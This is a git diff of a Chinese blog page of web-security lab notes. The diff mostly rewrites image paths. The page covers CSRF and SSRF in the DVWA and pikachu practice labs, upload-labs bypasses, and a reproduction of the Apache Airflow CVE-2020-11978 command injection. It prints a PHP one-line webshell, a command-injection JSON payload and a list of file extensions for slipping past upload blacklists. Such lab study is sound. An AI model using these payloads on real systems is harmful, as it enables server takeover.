+<p><img src="/F:/blog\source\_posts\漏洞part\175.png" alt></p>
 <h2 id="DVWA靶场-2"><a href="#DVWA靶场-2" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>出现修改密码的界面：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\180.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\180.png" alt></p>
 <p>输入123456，开启代理，开启抓包，点击Change提交，抓包得到：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\181.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\181.png" alt></p>
 <p>修改密码为111111后，关闭抓包：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\182.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\182.png" alt></p>
 <p>回到页面发现密码修改成功：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\183.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\183.png" alt></p>
 <p>复制网址：<a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a></p>
 <p>将密码改为111111，关闭代理，尝试访问该链接，前提是用户没有登出：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\184.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\184.png" alt></p>
 <p>此时，若原有用户登出，则其不知道密码（用默认密码登不进去）。</p>
 <h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>同样先抓个包：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\185.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\186.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\187.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\185.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\186.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\187.png" alt></p>
 <p>Copy下来访问</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\188.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\188.png" alt></p>
 <p>点击后便提交成功，把抓包关闭：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\189.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\189.png" alt></p>
 <p>修改成功</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\176.png" alt></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="/F:/blog\source\_posts\漏洞part\176.png" alt></p>
 <p>但是token值不能有规律</p>
 <p>自定义属性比如：在修改密码前需要输入原密码，或者增加验证码（通过短信验证）</p>
 <p>get型在url，post型在表单</p>
-<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\177.png" alt></p>
+<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><p><img src="/F:/blog\source\_posts\漏洞part\177.png" alt></p>
 <p>利用abc三个网站去理解（a：外部；b：中间网站；c：内部）</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\178.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\179.png" alt></p>
-<h2 id="pikachu靶场-1"><a href="#pikachu靶场-1" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h2><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\190.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\178.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\179.png" alt></p>
+<h2 id="pikachu靶场-1"><a href="#pikachu靶场-1" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h2><p><img src="/F:/blog\source\_posts\漏洞part\190.png" alt></p>
 <p>把原始链接：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php">http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php</a></p>
 <p>改为：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com">http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com</a></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\191.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\191.png" alt></p>
 <p>由此可以验证一下SSRF的危害，探测端口：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\192.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\193.png" alt="193"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\192.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\193.png" alt="193"></p>
 <p>即说明该网站与数据库有联系</p>
 <p>用dict亦可</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\194.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\194.png" alt></p>
 <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><p>看某一处是否存在文件上传，就是测试其是否可以解析相应的代码</p>
 <p>通过phpinfo信息证明是否上传成功：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\195.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\195.png" alt></p>
 <p>docker需装在linux主机上：centos、Ubuntu、kali等</p>
 <p>首先启动docker：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\196.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\196.png" alt></p>
 <p>在该处设置了88端口，查看kali的ip，以便在windows登录</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\197.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\197.png" alt></p>
 <p>出现此页面说明环境启动完成，便可在windows中登录</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\198.png" alt></p>
-<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><h4 id="方法一-禁用js"><a href="#方法一-禁用js" class="headerlink" title="方法一 禁用js"></a>方法一 禁用js</h4><h4 id="方法二-抓包"><a href="#方法二-抓包" class="headerlink" title="方法二 抓包"></a>方法二 抓包</h4><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\212.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\198.png" alt></p>
+<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><h4 id="方法一-禁用js"><a href="#方法一-禁用js" class="headerlink" title="方法一 禁用js"></a>方法一 禁用js</h4><h4 id="方法二-抓包"><a href="#方法二-抓包" class="headerlink" title="方法二 抓包"></a>方法二 抓包</h4><p><img src="/F:/blog\source\_posts\漏洞part\212.png" alt></p>
 <p>将后缀名改为允许的jpg，选择改文件，打开抓包，点击上传，发现被BP拦截到了：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\213.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\213.png" alt></p>
 <p>将后缀改为php后发包，关闭抓包，回到页面，发现其上传成功：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\214.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\215.png" alt="215"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\214.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\215.png" alt="215"></p>
 <p>能够执行php代码，说明被解析成功</p>
 <h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>网站是用php写的，将后缀名改为.php才有利用价值，因为网页虽然可以上传.png图片，但是不会对其解析，仅为图片，无法对其利用</p>
 <p>先上传php脚本文件：1.php，出现提示文件类型不正确，故查看源码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\216.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\216.png" alt></p>
 <p>发现其对后端检测，设置了可利用的几种文件type，故抓包进行参数修改：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\217.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\217.png" alt></p>
 <p>将Content-Type改为网页所允许的image/jpeg，再发包，关闭抓包，发现上传成功，第二关绕过：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\218.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\218.png" alt></p>
 <h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>先上传1.php，发现提示：不允许上传.asp .aspx .php .jsp后缀文件（为黑名单），查看源代码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\219.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\219.png" alt></p>
 <p>（非黑即白）通过php文件别名绕过（能被当为php脚本语言上传且执行）</p>
 <p>“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.php1”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.pHp1”</p>
 <p>依然在windows上操作，后缀名改为.php3，但是发现文件能被上传但不解析，故用kali上搭建的试试：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\220.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\220.png" alt></p>
 <h3 id="延申-1"><a href="#延申-1" class="headerlink" title="延申"></a>延申</h3><p>通过webshell一句话木马获取服务器权限</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\199.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\199.png" alt></p>
 <p>在此使用php一句话木马进行测试：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span> [<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\200.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\200.png" alt></p>
 <p>借助第一关做测试：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\201.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\201.png" alt></p>
 <p>说明网站对上传的后缀进行检测，想办法绕过</p>
 <p>点开提示：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\202.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\202.png" alt></p>
 <p>js即前端检测，则绕过前端检测：禁用js</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\203.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\203.png" alt></p>
 <p>再次上传，即可成功</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\204.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\207.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\205.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\206.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\204.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\207.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\205.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\206.png" alt></p>
 <p>得到地址，因所写代码执行，故看不到东西。接着用蚁剑去连接：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\208.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\208.png" alt></p>
 <p>右键——&gt;添加数据：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\209.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\209.png" alt></p>
 <p>点击“测试链接”，连接成功后，双击便可进入：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\210.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\210.png" alt></p>
 <p>可以增删查改，不管服务器在哪，可以下载文件、上传新的木马等等，也可右键—&gt;获取到主机的终端：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\211.png" alt></p>
-<h1 id="命令执行-代码执行"><a href="#命令执行-代码执行" class="headerlink" title="命令执行/代码执行"></a>命令执行/代码执行</h1><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\221.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\211.png" alt></p>
+<h1 id="命令执行-代码执行"><a href="#命令执行-代码执行" class="headerlink" title="命令执行/代码执行"></a>命令执行/代码执行</h1><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p><img src="/F:/blog\source\_posts\漏洞part\221.png" alt></p>
 <p>为什么存在代码执行：在代码中使用evel之类的敏感函数</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\222.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\222.png" alt></p>
 <p>代码执行漏洞发现：利用代码审计工具Seay</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\223.png" alt></p>
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\224.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\225.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\223.png" alt></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><img src="/F:/blog\source\_posts\漏洞part\224.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\225.png" alt></p>
 <p>漏洞成因：代码层过滤不严格、系统漏洞</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\227.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\227.png" alt></p>
 <p>Linux系统命令区分大小写</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\226.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\226.png" alt></p>
 <p>whoami也常用于查看权限</p>
 <p>查看文件的四个命令：head看前、tail看后、more看长文件用空格翻页</p>
 <h3 id="Apache-Airflow-CVE-2020-11978"><a href="#Apache-Airflow-CVE-2020-11978" class="headerlink" title="Apache Airflow(CVE-2020-11978)"></a>Apache Airflow(CVE-2020-11978)</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Airflow 是一个使用 python 语言编写的 data pipeline 调度和监控工作流的平台。Airflow 是通过 DAG（Directed acyclic graph 有向无环图）来管理任务流程的任务调度工具， 不需要知道业务数据的具体内容，设置任务的依赖关系即可实现任务调度。</p>
 <p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞，未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p>
 <h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="启动vulhub靶场环境"><a href="#启动vulhub靶场环境" class="headerlink" title="启动vulhub靶场环境"></a>启动vulhub靶场环境</h5><p>进入CVE-2020-11978文件夹：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\228.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\228.png" alt></p>
 <p>在该处打开终端，输入命令启动：</p>
 <p>sudo docker-compose run airflow-init</p>
 <p>sudo docker-compose up -d</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\229.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\229.png" alt></p>
 <p>查看是否启动成功，并且获得端口号：</p>
 <p>sudo docker ps</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\230.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\230.png" alt></p>
 <p>接着在浏览器访问，即可进入环境（airflow管理端）</p>
 <p>127.0.0.1:端口号</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\231.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\231.png" alt></p>
 <h5 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h5><p>将example_trigger_target_dag前面的Off改为On：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\232.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\232.png" alt></p>
 <p>点击进入example_trigger_target_dag页面，再点击Trigger DAG，进入到调试页面：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\233.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\233.png" alt></p>
 <p>在Configuration JSON中输入{“message”:”‘\”;touch /tmp/airflow_dag_success;#”}：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\234.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\234.png" alt></p>
 <p>再点击Trigger执行dag，等几秒可以看到显示成success，说明执行成功：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\235.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\236.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\235.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\236.png" alt></p>
 <p>进入容器查看目录，发现成功创建/tmp/airflow_dag_success文件，漏洞复现成功：</p>
 <p>sudo docker-compose exec airflow-worker bash</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\237.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\237.png" alt></p>
 <h5 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h5><p>上面能用touch创建文件，继续尝试反弹一个shell。</p>
 <p>首先进行在windows环境下nc(netcat)的安装：</p>
 <ul>
@@ -781,10 +781,12 @@ MathJax = {
 <p>docker stop [CONTAINER ID]</p>
 <p> 删除指定镜像：</p>
 <p>docker rmi -f [IMAGE ID]</p>
-<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\238.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\239.png" alt></p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="/F:/blog\source\_posts\漏洞part\238.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\239.png" alt></p>
 <p>require()找不到包含文件，该函数会报错；include()不报错，产生警告；有once()参数的文件中的代码只能包含一次。</p>
-
+<p><img src="/F:/blog\source\_posts\漏洞part\240.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\241.png" alt></p>
+<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2>
       </div>
       
         <div class="prev-or-next">
@@ -821,7 +823,7 @@ MathJax = {
   <div class="post-catalog hidden" id="catalog">
     <div class="title">Contents</div>
     <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%EF%BC%88SQL-Injection%EF%BC%89"><span class="toc-text">SQL注入（SQL Injection）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%EF%BC%88%E8%BF%87%E7%A8%8B%EF%BC%89"><span class="toc-text">定义（过程）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%A2%E6%88%90%E5%8E%9F%E5%9B%A0"><span class="toc-text">形成原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%BF%87%E7%A8%8B"><span class="toc-text">常见过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-injection%E5%8F%82%E6%95%B0"><span class="toc-text">SQL injection参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">在渗透测试过程中的作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E7%8E%B0%E4%BD%8D%E7%BD%AE"><span class="toc-text">出现位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BB%E6%89%BE%E6%96%B9%E5%BC%8F"><span class="toc-text">SQL注入漏洞寻找方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD%E4%BE%9D%E6%8D%AE"><span class="toc-text">SQL注入漏洞判断依据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81SQL%E6%B5%8B%E8%AF%95%E8%AF%AD%E5%8F%A5"><span class="toc-text">常见SQL测试语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E5%AD%97%E7%AC%A6"><span class="toc-text">注释字符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E8%BF%87%E7%A8%8B"><span class="toc-text">实操过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">sqli-labs手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%88Less-1%EF%BC%8C2%EF%BC%8C3%EF%BC%8C4%EF%BC%89"><span class="toc-text">SQL注入类型——联合查询（Less-1，2，3，4）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-1"><span class="toc-text">Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first"><span class="toc-text">first</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second"><span class="toc-text">second</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#third"><span class="toc-text">third</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#forth"><span class="toc-text">forth</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-2"><span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-3"><span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0"><span class="toc-text">sql注入练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88Less-5%EF%BC%8C6%EF%BC%89"><span class="toc-text">SQL注入类型——报错注入（Less-5，6）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-5"><span class="toc-text">Less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first-1"><span class="toc-text">first</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second-1"><span class="toc-text">second</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-Less-8"><span class="toc-text">SQL注入类型——布尔盲注(Less-8)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-8"><span class="toc-text">Less-8</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first-%E6%B1%82%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6"><span class="toc-text">first 求闭合字符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second-%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6length"><span class="toc-text">second 求数据库名长度length()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#third-%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%9A%84ascii%E5%80%BC-substr"><span class="toc-text">third 求数据库名的ascii值 substr</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#forth-%E6%B1%82%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8Fcount"><span class="toc-text">forth 求表的数量count()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fifth-%E6%B1%82%E8%A1%A8%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-text">fifth 求表的长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-Less-9"><span class="toc-text">SQL注入类型——时间盲注(Less-9)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-9"><span class="toc-text">Less-9</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" 